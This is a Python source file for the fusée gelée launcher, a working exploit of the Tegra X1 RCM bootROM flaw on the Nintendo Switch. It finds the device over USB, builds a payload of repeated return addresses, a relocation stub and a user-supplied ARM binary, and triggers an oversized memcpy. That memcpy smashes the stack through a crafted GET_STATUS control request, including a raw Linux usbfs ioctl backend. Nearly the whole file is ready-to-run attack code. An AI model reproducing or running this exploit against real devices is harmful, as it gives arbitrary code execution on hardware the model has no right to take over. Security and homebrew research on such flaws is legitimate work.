#!/usr/bin/env python3
#
# fusée gelée
#
# Launcher for the {re}switched coldboot/bootrom hacks--
# launches payloads above the Horizon
#
# simple edits from SuperOkazaki
# Please support LGBT rights ^-^
# discovery and implementation by @ktemkin
# likely independently discovered by lots of others <3
#
# special thanks to:
#    SciresM, motezazer -- guidance and support
#    hedgeberg, andeor  -- dumping the Jetson bootROM
#    TuxSH              -- for IDB notes that were nice to peek at
#
# much love to:
#    Aurora Wright, Qyriad, f916253, MassExplosion213, Schala, and Levi
#
# greetings to:
#    shuffle2

import os
import sys
import usb
import time
import ctypes
import argparse
import platform

# specify the locations of important load components
RCM_PAYLOAD_ADDR    = 0x40010000
INTERMEZZO_LOCATION = 0x4001F000
PAYLOAD_LOAD_BLOCK  = 0x40020000

# notes:
# GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
# GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
# GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>

class HaxBackend:
    """
    Base class for backends for the TegraRCM vuln.
    """

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82

    # Interface requests
    GET_STATUS        = 0x0

    # List of OSs this class supports.
    SUPPORTED_SYSTEMS = []

    def __init__(self, usb_device):
        """ Sets up the backend for the given device. """
        self.dev = usb_device


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        pass


    def trigger_vulnerability(self, length):
        """
        Triggers the actual controlled memcpy.
        The actual trigger needs to be executed carefully, as different host OSs
        require us to ask for our invalid control request differently.
        """
        raise NotImplementedError("Trying to use an abstract backend rather than an instance of the proper subclass!")


    @classmethod
    def supported(cls, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """

        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system in cls.SUPPORTED_SYSTEMS


    @classmethod
    def create_appropriate_backend(cls, usb_device):
        """ Creates a backend object appropriate for the current OS. """

        # Search for a supportive backend, and try to create one.
        for subclass in cls.__subclasses__():
            if subclass.supported():
                return subclass(usb_device)

        # ... if we couldn't, bail out.
        raise IOError("No backend to trigger the vulnerability-- it's likely we don't support your OS!")



class MacOSBackend(HaxBackend):
    """
    Simple vulnerability trigger for macOS: we simply ask libusb to issue
    the broken control request, and it'll do it for us. :)

    We also support platforms with a hacked libusb.
    """

    BACKEND_NAME = "macOS"
    SUPPORTED_SYSTEMS = ['Darwin', 'libusbhax', 'macos']

    def trigger_vulnerability(self, length):

        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)



class LinuxBackend(HaxBackend):
    """
    More complex vulnerability trigger for Linux: we can't go through libusb,
    as it limits control requests to a single page size, the limitation expressed
    by the usbfs. More realistically, the usbfs seems fine with it, and we just
    need to work around libusb.
    """

    BACKEND_NAME = "Linux"
    SUPPORTED_SYSTEMS = ['Linux', 'linux']
    SUPPORTED_USB_CONTROLLERS = ['pci/drivers/xhci_hcd', 'platform/drivers/dwc_otg']

    SETUP_PACKET_SIZE = 8

    IOCTL_IOR   = 0x80000000
    IOCTL_TYPE  = ord('U')
    IOCTL_NR_SUBMIT_URB = 10

    URB_CONTROL_REQUEST = 2

    class SubmitURBIoctl(ctypes.Structure):
        _fields_ = [
            ('type',          ctypes.c_ubyte),
            ('endpoint',      ctypes.c_ubyte),
            ('status',        ctypes.c_int),
            ('flags',         ctypes.c_uint),
            ('buffer',        ctypes.c_void_p),
            ('buffer_length', ctypes.c_int),
            ('actual_length', ctypes.c_int),
            ('start_frame',   ctypes.c_int),
            ('stream_id',     ctypes.c_uint),
            ('error_count',   ctypes.c_int),
            ('signr',         ctypes.c_uint),
            ('usercontext',   ctypes.c_void_p),
        ]


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        print("\nImportant note: on desktop Linux systems, we currently require an XHCI host controller.")
        print("A good way to ensure you're likely using an XHCI backend is to plug your")
        print("device into a blue 'USB 3' port.\n")


    def trigger_vulnerability(self, length):
        """
        Submit the control request directly using the USBFS submit_urb
        ioctl, which issues the control request directly. This allows us
        to send our giant control request despite size limitations.
        """

        import os
        import fcntl

        # We only work for devices that are bound to a compatible HCD.
        self._validate_environment()

        # Figure out the USB device file we're going to use to issue the
        # control request.
        fd = os.open('/dev/bus/usb/{:0>3d}/{:0>3d}'.format(self.dev.bus, self.dev.address), os.O_RDWR)

        # Define the setup packet to be submitted.
        setup_packet = \
            int.to_bytes(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, 1, byteorder='little') + \
            int.to_bytes(self.GET_STATUS,                                  1, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(length,                                           2, byteorder='little')

        # Create a buffer to hold the result.
        buffer_size = self.SETUP_PACKET_SIZE + length
        buffer = ctypes.create_string_buffer(setup_packet, buffer_size)

        # Define the data structure used to issue the control request URB.
        request = self.SubmitURBIoctl()
        request.type          = self.URB_CONTROL_REQUEST
        request.endpoint      = 0
        request.buffer        = ctypes.addressof(buffer)
        request.buffer_length = buffer_size

        # Manually submit an URB to the kernel, so it issues our 'evil' control request.
        ioctl_number = (self.IOCTL_IOR | ctypes.sizeof(request) << 16 | ord('U') << 8 | self.IOCTL_NR_SUBMIT_URB)
        fcntl.ioctl(fd, ioctl_number, request, True)

        # Close our newly created fd.
        os.close(fd)

        # The other modules raise an IOError when the control request fails to complete. We don't fail out (as we don't bother
        # reading back), so we'll simulate the same behavior as the others.
        raise IOError("Raising an error to match the others!")


    def _validate_environment(self):
        """
        We can only inject giant control requests on devices that are backed
        by certain usb controllers-- typically, the xhci_hcd on most PCs.
        """

        from glob import glob

        # Search each device bound to the xhci_hcd driver for the active device...
        for hci_name in self.SUPPORTED_USB_CONTROLLERS:
            for path in glob("/sys/bus/{}/*/usb*".format(hci_name)):
                if self._node_matches_our_device(path):
                    return

        raise ValueError("This device needs to be on an XHCI backend. Usually that means plugged into a blue/USB 3.0 port!\nBailing out.")


    def _node_matches_our_device(self, path):
        """
        Checks to see if the given sysfs node matches our given device.
        Can be used to check if an xhci_hcd controller subnode reflects a given device.,
        """

        # If this isn't a valid USB device node, it's not what we're looking for.
        if not os.path.isfile(path + "/busnum"):
            return False

        # We assume that a whole _bus_ is associated with a host controller driver, so we
        # only check for a matching bus ID.
        if self.dev.bus != self._read_num_file(path + "/busnum"):
            return False

        # If all of our checks passed, this is our device.
        return True


    def _read_num_file(self, path):
        """
        Reads a numeric value from a sysfs file that contains only a number.
        """

        with open(path, 'r') as f:
            raw = f.read()
            return int(raw)



# FIXME: Implement a Windows backend that talks to a patched version of libusbK
#        so we can inject WdfUsbTargetDeviceSendControlTransferSynchronously to
#        trigger the exploit.


class RCMHax:

    # Default to the Nintendo Switch RCM VID and PID.
    DEFAULT_VID = 0x0955
    DEFAULT_PID = 0x7321

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_DEVICE   = 0x80
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Exploit specifics
    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]   # The addresses of the DMA buffers we can trigger a copy _from_.
    STACK_END               = 0x40010000                 # The address just after the end of the device's stack.

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None):
        """ Set up our RCM hack connection."""

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Grab a connection to the USB device itself.
        self.dev = self._find_device(vid, pid)

        # Keep track of the total amount written.
        self.total_written = 0

        # If we don't have a device...
        if self.dev is None:

            # ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device:
                print("Waiting for a TegraRCM to come online...")
                while self.dev is None:
                    self.dev = self._find_device()

            # ... or bail out.
            else:
                raise IOError("No TegraRCM device found?")

        # Create a vulnerability backend for the given device.
        try:
            self.backend = HaxBackend.create_appropriate_backend(self.dev)
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            sys.exit(-1)

        # Print any use-related warnings.
        self.backend.print_warnings()

        # Notify the user of which backend we're using.
        print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def _find_device(self, vid=None, pid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID. """

        # Apply our default VID and PID if neither are provided...
        vid = vid if vid else self.DEFAULT_VID
        pid = pid if pid else self.DEFAULT_PID

        # ... and use them to find a USB device.
        return usb.core.find(idVendor=vid, idProduct=pid)


    def get_device_descriptor(self):
        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST, self.GET_DESCRIPTOR, 1 << 8, 0, 18)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.dev.read(0x81, length, 1000)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = 0x1000

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.dev.write(0x01, data, 1000)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if switch.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            switch.write(b'\0' * 0x1000)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address()

        return self.backend.trigger_vulnerability(length)

def parse_usb_id(id):
    """ Quick function to parse VID/PID arguments. """
    return int(id, 16)

# Read our arguments.
parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched; should be linked at 0x40010000')
parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
parser.add_argument('--override-os', metavar='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="intermezzo.bin", help='provides the path to the intermezzo relocation stub')
arguments = parser.parse_args()

# Expand out the payload path to handle any user-refrences.
payload_path = os.path.expanduser(arguments.payload)
if not os.path.isfile(payload_path):
    print("That payload doesn't exist!")
    sys.exit(-1)

# Find our intermezzo relocator...
intermezzo_path = os.path.expanduser(arguments.relocator)
if not os.path.isfile(intermezzo_path):
    print("Could not find the intermezzo interposer. Did you build it?")
    sys.exit(-1)

# Get a connection to our device.
try:
    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, pid=arguments.pid)
except IOError as e:
    print(e)
    sys.exit(-1)

# Print the device's ID. Note that reading the device's ID is necessary to get it into
device_id = switch.read_device_id().tostring()
print("Found a Tegra with Device ID: {}".format(device_id))

# Prefix the image with an RCM command, so it winds up loaded into memory
# at the right location (0x40010000).

# Use the maximum length accepted by RCM, so we can transmit as much payload as 
# we want; we'll take over before we get to the end.
length  = 0x30298
payload = length.to_bytes(4, byteorder='little')

# pad out to 680 so the payload starts at the right address in IRAM
payload += b'\0' * (680 - len(payload))

# Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
# We'll use this data to smash the stack when we execute the vulnerable memcpy.
print("\nSetting ourselves up to smash the stack...")
repeat_count = int((INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR) / 4)
intermezzo_location_raw = INTERMEZZO_LOCATION.to_bytes(4, byteorder='little')
payload += (intermezzo_location_raw * repeat_count)

# Include the Intermezzo binary in the command stream. This is our first-stage
# payload, and it's responsible for relocating the final payload to 0x40010000.
intermezzo_size = 0
with open(intermezzo_path, "rb") as f:
    intermezzo      = f.read()
    intermezzo_size = len(intermezzo)
    payload        += intermezzo


# Finally, pad until we've reached the position we need to put the payload.
# This ensures the payload winds up at the location Intermezzo expects.
position = INTERMEZZO_LOCATION + intermezzo_size
padding_size = PAYLOAD_LOAD_BLOCK - position
payload += (b'\0' * padding_size)

# Read the payload into memory.
with open(payload_path, "rb") as f:
    payload += f.read()

# Pad the payload to fill a USB request exactly, so we don't send a short
# packet and break out of the RCM loop.
payload_length = len(payload)
padding_size   = 0x1000 - (payload_length % 0x1000)
payload += (b'\0' * padding_size)

# Send the constructed payload, which contains the command, the stack smashing
# values, the Intermezzo relocation stub, and the final payload.
print("Uploading payload...")
switch.write(payload)

# The RCM backend alternates between two different DMA buffers. Ensure we're
# about to DMA into the higher one, so we have less to copy during our attack.
switch.switch_to_highbuf()

# Smash the device's stack, triggering the vulnerability.
print("Smashing the stack...")
try:
    switch.trigger_controlled_memcpy()
except ValueError as e:
    print(str(e))
except IOError:
    print("OwO your Switch is hacked OwO")
    print("Yokudekimashita~")

